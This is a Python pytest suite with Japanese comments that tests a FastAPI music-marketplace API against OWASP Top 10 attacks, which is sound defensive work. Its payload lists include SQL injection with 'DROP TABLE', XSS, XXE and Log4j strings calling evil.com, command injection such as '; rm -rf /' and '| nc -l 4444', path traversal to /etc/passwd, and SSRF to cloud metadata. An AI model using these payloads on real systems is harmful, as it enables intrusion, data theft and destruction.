"""
セキュリティ脆弱性包括テストスイート

OWASP Top 10および一般的なセキュリティ脆弱性を網羅的にテストします。
"""

import pytest
import json
import base64
import hashlib
import hmac
import time
import re
from urllib.parse import quote, unquote
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from unittest.mock import patch, MagicMock

from app.main import app
from app.db.session import SessionLocal
from seed_data import create_seed_data
from tests.conftest import TestingSessionLocal, engine


class TestSecurityVulnerabilities:
    """セキュリティ脆弱性テストクラス"""
    
    @classmethod
    def setup_class(cls):
        """セキュリティテストセットアップ"""
        print("🔒 セキュリティ脆弱性テスト開始...")
        # テスト用データベースでセットアップ
        from app.models.base import Base
        from app.models.user import User
        from app.schemas.user import UserRole
        import uuid
        
        Base.metadata.create_all(bind=engine)
        cls.client = TestClient(app)
        cls.session = TestingSessionLocal()
        
        # テスト用ユーザーを作成
        cls._create_test_users()
        print("✅ セキュリティテスト環境準備完了")
    
    @classmethod
    def _create_test_users(cls):
        """テスト用ユーザーを作成"""
        from app.models.user import User
        from app.schemas.user import UserRole
        import uuid
        
        try:
            # テスト用リスナー
            listener = User(
                id=str(uuid.uuid4()),
                email="security_test_listener@example.com",
                firebase_uid="firebaseuid_listener",
                display_name="Security Test Listener",
                user_role=UserRole.LISTENER,
                is_verified=True
            )
            cls.session.add(listener)
            
            # テスト用アーティスト
            artist = User(
                id=str(uuid.uuid4()),
                email="security_test_artist@example.com",
                firebase_uid="firebaseuid_artist",
                display_name="Security Test Artist",
                user_role=UserRole.ARTIST,
                is_verified=True
            )
            cls.session.add(artist)
            cls.session.commit()
            
        except Exception as e:
            print(f"セキュリティテストユーザー作成エラー: {e}")
            cls.session.rollback()
    
    @classmethod
    def teardown_class(cls):
        """セキュリティテストクリーンアップ"""
        cls.session.close()
    
    # ==================== OWASP A01: Broken Access Control ====================
    
    def test_vertical_privilege_escalation(self):
        """垂直権限昇格テスト"""
        # リスナーがアーティスト機能にアクセス
        listener_headers = {"Authorization": "Bearer mock_token_listener"}
        
        # アーティスト専用エンドポイントへのアクセス試行
        artist_endpoints = [
            ("/api/v1/tracks/", "POST", {"title": "Unauthorized", "duration": 180, "price": 300}),
            ("/api/v1/tracks/upload/audio", "POST", {}),
            ("/api/v1/tracks/upload/cover", "POST", {}),
            ("/api/v1/artists/any-id/revenue", "GET", {}),
            ("/api/v1/artists/any-id/statistics", "GET", {}),
        ]
        
        for endpoint, method, data in artist_endpoints:
            if method == "POST":
                response = self.client.post(endpoint, headers=listener_headers, json=data)
            else:
                response = self.client.get(endpoint, headers=listener_headers)
            
            assert response.status_code in [401, 403, 404], f"Failed for {endpoint}"
    
    def test_horizontal_privilege_escalation(self):
        """水平権限昇格テスト"""
        # ユーザーAが他のユーザーBのリソースにアクセス
        user_a_headers = {"Authorization": "Bearer mock_token_user_a"}
        user_b_id = "different_user_id"
        
        # 他ユーザーの個人情報アクセス試行
        protected_endpoints = [
            f"/api/v1/users/{user_b_id}",
            f"/api/v1/users/{user_b_id}/tracks",
            "/api/v1/purchases/",  # 他ユーザーの購入履歴
            f"/api/v1/artists/{user_b_id}/revenue",
        ]
        
        for endpoint in protected_endpoints:
            response = self.client.get(endpoint, headers=user_a_headers)
            assert response.status_code in [401, 403, 404]
    
    def test_insecure_direct_object_references(self):
        """不安全な直接オブジェクト参照テスト"""
        # 予測可能なIDでのアクセス試行
        predictable_ids = [
            "1", "2", "3", "admin", "root", "test",
            "00000000-0000-0000-0000-000000000001",
            "user_1", "artist_1", "track_1"
        ]
        
        for obj_id in predictable_ids:
            endpoints = [
                f"/api/v1/users/{obj_id}",
                f"/api/v1/tracks/{obj_id}",
                f"/api/v1/artists/{obj_id}",
            ]
            
            for endpoint in endpoints:
                response = self.client.get(endpoint)
                # 適切な認証チェックが行われているかを確認
                assert response.status_code in [401, 403, 404, 422]
    
    # ==================== OWASP A02: Cryptographic Failures ====================
    
    def test_weak_session_management(self):
        """脆弱なセッション管理テスト"""
        # 弱いセッショントークンの検出
        weak_tokens = [
            "12345678",
            "password",
            "admin123",
            "sessionid",
            "token",
            base64.b64encode(b"admin:admin").decode(),
        ]
        
        for token in weak_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = self.client.get("/api/v1/auth/me", headers=headers)
            assert response.status_code in [401, 422]
    
    def test_data_exposure_in_transit(self):
        """データ転送時の機密情報露出テスト"""
        # レスポンスに機密情報が含まれていないかチェック
        response = self.client.get("/api/v1/tracks/")
        
        if response.status_code == 200:
            response_text = response.text.lower()
            
            # 機密情報が露出していないことを確認
            sensitive_patterns = [
                "password", "secret", "private_key", "api_key",
                "database_url", "jwt_secret", "stripe_secret",
                "firebase_private_key", "s3_secret_key"
            ]
            
            for pattern in sensitive_patterns:
                assert pattern not in response_text
    
    def test_insecure_randomness(self):
        """不安全な乱数生成テスト"""
        # 複数回のリクエストでIDの予測可能性をチェック
        user_ids = []
        
        for i in range(10):
            user_data = {
                "email": f"random_test_{i}@example.com",
                "display_name": f"Random Test {i}",
                "firebase_uid": f"random_test_uid_{i}",
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            if response.status_code == 200:
                user_ids.append(response.json()["id"])
        
        # IDが予測可能でないことを確認
        if len(user_ids) >= 2:
            # 連続した数値やパターンでないことを確認
            for i in range(len(user_ids) - 1):
                current_id = user_ids[i]
                next_id = user_ids[i + 1]
                
                # 単純な増分でないことを確認
                if current_id.isdigit() and next_id.isdigit():
                    assert int(next_id) - int(current_id) != 1
    
    # ==================== OWASP A03: Injection ====================
    
    def test_sql_injection_comprehensive(self):
        """包括的SQLインジェクションテスト"""
        sql_payloads = [
            # 基本的なSQLインジェクション
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE user; --",
            "' UNION SELECT * FROM user--",
            
            # ブラインドSQLインジェクション
            "' AND (SELECT COUNT(*) FROM user) > 0--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            
            # 時間ベースSQLインジェクション
            "' OR IF(1=1, SLEEP(5), 0)--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            
            # エラーベースSQLインジェクション
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # NoSQLインジェクション
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
        ]
        
        # 検索パラメータでのSQLインジェクション
        for payload in sql_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            
            # SQLエラーが露出していないことを確認
            assert response.status_code in [200, 400, 422]
            
            if response.status_code != 200:
                error_text = response.text.lower()
                sql_error_indicators = [
                    "sql", "mysql", "postgresql", "sqlite", "database",
                    "syntax error", "table", "column", "select", "insert",
                    "update", "delete", "drop", "union"
                ]
                
                for indicator in sql_error_indicators:
                    assert indicator not in error_text
    
    def test_nosql_injection(self):
        """NoSQLインジェクションテスト"""
        nosql_payloads = [
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "return true"}',
            '{"$expr": {"$gt": [{"$size": "$array"}, 0]}}',
        ]
        
        for payload in nosql_payloads:
            # JSON形式での攻撃試行
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            assert response.status_code in [200, 400, 422]
    
    def test_ldap_injection(self):
        """LDAPインジェクションテスト"""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
        ]
        
        for payload in ldap_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            assert response.status_code in [200, 400, 422]
    
    def test_xpath_injection(self):
        """XPathインジェクションテスト"""
        xpath_payloads = [
            "' or '1'='1",
            "'] | //user/*[contains(*,'Admin')] | //['",
            "' or count(parent::*[position()=1])=0 or '",
        ]
        
        for payload in xpath_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            assert response.status_code in [200, 400, 422]
    
    # ==================== OWASP A04: Insecure Design ====================
    
    def test_business_logic_flaws(self):
        """ビジネスロジック欠陥テスト"""
        # 負の価格での楽曲作成試行
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        invalid_track_data = [
            {"title": "Free Track", "duration": 180, "price": -100},  # 負の価格
            {"title": "Zero Track", "duration": 180, "price": 0},     # ゼロ価格
            {"title": "Long Track", "duration": -1, "price": 300},    # 負の再生時間
            {"title": "", "duration": 180, "price": 300},             # 空のタイトル
            {"title": "A" * 10000, "duration": 180, "price": 300},   # 極端に長いタイトル
        ]
        
        for track_data in invalid_track_data:
            response = self.client.post("/api/v1/tracks/", 
                                      headers=headers, json=track_data)
            assert response.status_code in [400, 422]
    
    def test_workflow_circumvention(self):
        """ワークフロー回避攻撃テスト"""
        # 購入前にダウンロードを試行
        headers = {"Authorization": "Bearer mock_token_listener"}
        
        tracks_response = self.client.get("/api/v1/tracks/?limit=1")
        if tracks_response.status_code == 200:
            tracks = tracks_response.json()
            if tracks:
                track_id = tracks[0]["id"]
                
                # 購入せずにダウンロードを試行
                download_response = self.client.get(
                    f"/api/v1/purchases/track/{track_id}/download",
                    headers=headers
                )
                assert download_response.status_code in [403, 404]
    
    # ==================== OWASP A05: Security Misconfiguration ====================
    
    def test_information_disclosure(self):
        """情報漏洩テスト"""
        # エラーページからの情報漏洩チェック
        response = self.client.get("/nonexistent-endpoint")
        assert response.status_code == 404
        
        error_text = response.text.lower()
        sensitive_info = [
            "stack trace", "traceback", "exception",
            "/users/", "/home/", "c:\\", "database",
            "password", "secret", "internal server error details"
        ]
        
        for info in sensitive_info:
            assert info not in error_text
    
    def test_debug_information_exposure(self):
        """デバッグ情報露出テスト"""
        # デバッグモードの情報が露出していないかチェック
        endpoints = ["/", "/docs", "/openapi.json"]
        
        for endpoint in endpoints:
            response = self.client.get(endpoint)
            if response.status_code == 200:
                content = response.text.lower()
                
                debug_indicators = [
                    "debug=true", "development", "localhost",
                    "stack trace", "internal error", "django_debug"
                ]
                
                for indicator in debug_indicators:
                    assert indicator not in content
    
    def test_default_credentials(self):
        """デフォルト認証情報テスト"""
        default_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("admin", "123456"),
            ("test", "test"),
        ]
        
        for username, password in default_creds:
            auth_data = {
                "email": f"{username}@example.com",
                "password": password
            }
            
            response = self.client.post("/api/v1/auth/login", json=auth_data)
            # デフォルト認証情報でのログインは失敗するべき
            assert response.status_code in [400, 401, 422]
    
    # ==================== OWASP A06: Vulnerable Components ====================
    
    def test_dependency_vulnerabilities(self):
        """依存関係脆弱性テスト"""
        # 既知の脆弱なエンドポイントパターンをテスト
        vulnerable_patterns = [
            "/console",           # Spring Boot Actuator
            "/actuator",         # Spring Boot Actuator
            "/management",       # Management endpoints
            "/.env",             # Environment files
            "/config.php",       # PHP config files
            "/web.config",       # ASP.NET config
            "/robots.txt",       # Robot exclusion
            "/sitemap.xml",      # Sitemap
        ]
        
        for pattern in vulnerable_patterns:
            response = self.client.get(pattern)
            # これらのエンドポイントは存在しないか、適切に保護されているべき
            assert response.status_code in [404, 403, 401]
    
    # ==================== OWASP A07: Identity and Authentication Failures ====================
    
    def test_weak_password_policy(self):
        """脆弱なパスワードポリシーテスト"""
        weak_passwords = [
            "123",
            "password",
            "admin",
            "12345678",
            "qwerty",
            "abc123",
            "",  # 空のパスワード
        ]
        
        for weak_pwd in weak_passwords:
            user_data = {
                "email": f"weak_{hash(weak_pwd)}@example.com",
                "display_name": "Weak Password User",
                "firebase_uid": f"weak_uid_{hash(weak_pwd)}",
                "user_role": "LISTENER",
                "password": weak_pwd
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            # 弱いパスワードは拒否されるべき（実装により異なる）
            if response.status_code == 400:
                error_response = response.json()
                assert "password" in error_response["detail"].lower()
    
    def test_brute_force_protection(self):
        """ブルートフォース攻撃保護テスト"""
        # 同じユーザーで複数回ログイン失敗を試行
        failed_attempts = []
        
        for i in range(10):
            login_data = {
                "email": "brute_force_test@example.com",
                "password": f"wrong_password_{i}"
            }
            
            response = self.client.post("/api/v1/auth/login", json=login_data)
            failed_attempts.append(response.status_code)
            
            # わずかな遅延を入れて現実的な攻撃をシミュレート
            time.sleep(0.1)
        
        # 連続した失敗後にアカウントロックまたはレート制限が発生するべき
        if len(failed_attempts) > 5:
            later_attempts = failed_attempts[5:]
            # 後半の試行で429 (Too Many Requests) が返されることを期待
            assert any(status == 429 for status in later_attempts)
    
    def test_session_fixation(self):
        """セッション固定攻撃テスト"""
        # 事前定義されたセッションIDでの認証試行
        fixed_session = "FIXED_SESSION_ID_123"
        
        headers = {
            "Authorization": f"Bearer {fixed_session}",
            "Cookie": f"session_id={fixed_session}"
        }
        
        response = self.client.get("/api/v1/auth/me", headers=headers)
        assert response.status_code in [401, 422]
    
    # ==================== OWASP A08: Software and Data Integrity Failures ====================
    
    def test_deserialization_attacks(self):
        """デシリアライゼーション攻撃テスト"""
        # 悪意のあるシリアライズデータでの攻撃試行
        malicious_payloads = [
            # Python pickle攻撃
            "gASVOgAAAAAAAAB9lIwEbmFtZZSMBGV2aWyUc4aULg==",
            
            # JSON攻撃
            '{"__type": "System.Object", "value": "malicious"}',
            
            # XML攻撃
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY test SYSTEM "file:///etc/passwd">]><test>&test;</test>',
        ]
        
        for payload in malicious_payloads:
            # Base64エンコードされたペイロードでの攻撃
            response = self.client.post("/api/v1/auth/register", 
                                      data=payload,
                                      headers={"Content-Type": "application/json"})
            assert response.status_code in [400, 422]
    
    def test_unsigned_code_execution(self):
        """署名されていないコード実行テスト"""
        # コード実行を試みる悪意のあるペイロード
        code_execution_payloads = [
            "__import__('os').system('whoami')",
            "eval('__import__(\"os\").system(\"whoami\")')",
            "exec('import os; os.system(\"whoami\")')",
            "${jndi:ldap://evil.com/exploit}",  # Log4j
            "{{7*7}}",  # Template injection
            "<%=7*7%>",  # JSP injection
        ]
        
        for payload in code_execution_payloads:
            track_data = {
                "title": payload,
                "description": "Code execution test",
                "genre": "テスト",
                "duration": 180,
                "price": 300
            }
            
            headers = {"Authorization": "Bearer mock_token_artist"}
            response = self.client.post("/api/v1/tracks/", 
                                      headers=headers, json=track_data)
            
            # コード実行は防がれるべき
            if response.status_code == 200:
                created_track = response.json()
                # ペイロードがそのまま実行されていないことを確認
                assert created_track["title"] == payload  # サニタイズされて保存
                assert "49" not in str(created_track)  # 7*7=49が実行されていない
    
    # ==================== OWASP A09: Security Logging and Monitoring Failures ====================
    
    def test_audit_trail_tampering(self):
        """監査証跡改ざんテスト"""
        # ログ削除・改ざんの試行
        log_tampering_payloads = [
            "\x00",  # Null byte
            "\r\n[FAKE LOG] Admin login successful",
            "\x08\x08\x08\x08",  # Backspace characters
            "\x1b[2J\x1b[H",  # ANSI escape sequences
        ]
        
        for payload in log_tampering_payloads:
            user_data = {
                "email": f"log_test@example.com",
                "display_name": payload,
                "firebase_uid": "log_test_uid",
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            # ログ改ざんは防がれるべき
            assert response.status_code in [200, 400, 422]
    
    def test_log_injection(self):
        """ログインジェクション攻撃テスト"""
        # ログに悪意のあるデータを注入する試行
        log_injection_payloads = [
            "admin\nINFO: Fake admin login successful",
            "test\r\nERROR: System compromised",
            "user\x00\nSUCCESS: Root access granted",
        ]
        
        for payload in log_injection_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            assert response.status_code in [200, 400, 422]
    
    # ==================== OWASP A10: Server-Side Request Forgery (SSRF) ====================
    
    def test_ssrf_attacks(self):
        """SSRF攻撃テスト"""
        ssrf_payloads = [
            "http://localhost:22",      # 内部サービススキャン
            "http://127.0.0.1:3306",   # データベースアクセス
            "http://169.254.169.254/", # AWS メタデータサービス
            "file:///etc/passwd",      # ローカルファイル読み取り
            "ftp://internal.server/",  # 内部FTPサーバー
            "gopher://localhost:25/",  # Gopher プロトコル
            "dict://localhost:11211/", # Memcached
            "ldap://internal.ldap/",   # LDAP サーバー
        ]
        
        # アバター画像URLなどでSSRF攻撃を試行
        for payload in ssrf_payloads:
            track_data = {
                "title": "SSRF Test Track",
                "description": "SSRF test",
                "genre": "テスト",
                "cover_art_url": payload,  # SSRF攻撃ベクター
                "audio_file_url": "https://example.com/audio.mp3",
                "duration": 180,
                "price": 300
            }
            
            headers = {"Authorization": "Bearer mock_token_artist"}
            response = self.client.post("/api/v1/tracks/", 
                                      headers=headers, json=track_data)
            
            # SSRF攻撃は防がれるべき
            assert response.status_code in [400, 422]
    
    # ==================== 追加のセキュリティテスト ====================
    
    def test_xml_external_entity_injection(self):
        """XXE (XML External Entity) インジェクションテスト"""
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><test>&xxe;</test>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><test></test>',
        ]
        
        for payload in xxe_payloads:
            response = self.client.post("/api/v1/auth/register",
                                      data=payload,
                                      headers={"Content-Type": "application/xml"})
            # XXE攻撃は防がれるべき
            assert response.status_code in [400, 415, 422]  # Unsupported Media Type
    
    def test_cross_site_scripting_comprehensive(self):
        """包括的XSS攻撃テスト"""
        xss_payloads = [
            # 基本的なXSS
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            
            # フィルター回避XSS
            "<ScRiPt>alert('xss')</ScRiPt>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            
            # イベントハンドラーXSS
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus><option>test</option></select>",
            
            # 属性内XSS
            "\" onmouseover=\"alert('xss')\"",
            "' onclick='alert(\"xss\")'",
            
            # Unicode/エンコーディング回避
            "<script>alert(\u0027xss\u0027)</script>",
            "%3Cscript%3Ealert('xss')%3C/script%3E",
            
            # DOM Based XSS
            "<img src=x onerror=eval(atob('YWxlcnQoJ3hzcycp'))>",  # Base64: alert('xss')
        ]
        
        for payload in xss_payloads:
            # 楽曲タイトルでのXSSテスト
            track_data = {
                "title": payload,
                "description": "XSS test track",
                "genre": "テスト",
                "duration": 180,
                "price": 300
            }
            
            headers = {"Authorization": "Bearer mock_token_artist"}
            response = self.client.post("/api/v1/tracks/", 
                                      headers=headers, json=track_data)
            
            if response.status_code == 200:
                # 作成された楽曲を取得してXSSペイロードが適切にエスケープされているか確認
                created_track = response.json()
                track_id = created_track["id"]
                
                detail_response = self.client.get(f"/api/v1/tracks/{track_id}")
                if detail_response.status_code == 200:
                    detail_content = detail_response.text
                    
                    # XSSペイロードが実行可能な形で含まれていないことを確認
                    dangerous_patterns = [
                        "<script", "javascript:", "onerror=", "onload=",
                        "onclick=", "onmouseover=", "onfocus="
                    ]
                    
                    for pattern in dangerous_patterns:
                        assert pattern.lower() not in detail_content.lower()
    
    def test_command_injection(self):
        """コマンドインジェクション攻撃テスト"""
        command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -l 4444",
            "; ping evil.com",
        ]
        
        for payload in command_injection_payloads:
            # ファイルアップロード時のファイル名でのコマンドインジェクション
            headers = {"Authorization": "Bearer mock_token_artist"}
            files = {"file": (f"test{payload}.mp3", b"audio content", "audio/mpeg")}
            
            response = self.client.post("/api/v1/tracks/upload/audio",
                                      headers=headers, files=files)
            
            # コマンドインジェクションは防がれるべき
            assert response.status_code in [400, 422]
    
    def test_path_traversal_comprehensive(self):
        """包括的パストラバーサル攻撃テスト"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
        ]
        
        for payload in path_traversal_payloads:
            # ファイルアクセス系エンドポイントでのパストラバーサル
            response = self.client.get(f"/api/v1/tracks/{quote(payload)}")
            assert response.status_code in [400, 404, 422]
            
            # アップロード時のファイル名での攻撃
            headers = {"Authorization": "Bearer mock_token_artist"}
            files = {"file": (payload, b"content", "audio/mpeg")}
            
            upload_response = self.client.post("/api/v1/tracks/upload/audio",
                                             headers=headers, files=files)
            assert upload_response.status_code in [400, 422]
    
    def test_http_response_splitting(self):
        """HTTPレスポンス分割攻撃テスト"""
        response_splitting_payloads = [
            "test\r\nSet-Cookie: admin=true",
            "test\r\n\r\n<script>alert('xss')</script>",
            "test%0d%0aSet-Cookie:%20admin=true",
            "test\x0d\x0aContent-Length: 0\x0d\x0a\x0d\x0aHTTP/1.1 200 OK\x0d\x0a",
        ]
        
        for payload in response_splitting_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            
            # レスポンスヘッダーが適切に処理されていることを確認
            assert response.status_code in [200, 400, 422]
            
            # 悪意のあるヘッダーが注入されていないことを確認
            dangerous_headers = ["set-cookie", "location", "content-type"]
            for header in dangerous_headers:
                if header in response.headers:
                    assert "admin=true" not in response.headers[header].lower()
                    assert "<script>" not in response.headers[header].lower()
    
    def test_timing_attacks(self):
        """タイミング攻撃テスト"""
        # 存在するユーザーと存在しないユーザーでの応答時間差を測定
        existing_email = "listener1@example.com"  # Seedデータの既存メール
        nonexistent_email = "nonexistent123456@example.com"
        
        # 存在するユーザーでの認証試行時間
        start_time = time.time()
        existing_response = self.client.post("/api/v1/auth/login", json={
            "email": existing_email,
            "password": "wrong_password"
        })
        existing_time = time.time() - start_time
        
        # 存在しないユーザーでの認証試行時間
        start_time = time.time()
        nonexistent_response = self.client.post("/api/v1/auth/login", json={
            "email": nonexistent_email,
            "password": "wrong_password"
        })
        nonexistent_time = time.time() - start_time
        
        # 応答時間の差が過度に大きくないことを確認（タイミング攻撃防止）
        time_difference = abs(existing_time - nonexistent_time)
        assert time_difference < 1.0  # 1秒以内の差
        
        # どちらも認証失敗になることを確認
        assert existing_response.status_code in [400, 401]
        assert nonexistent_response.status_code in [400, 401]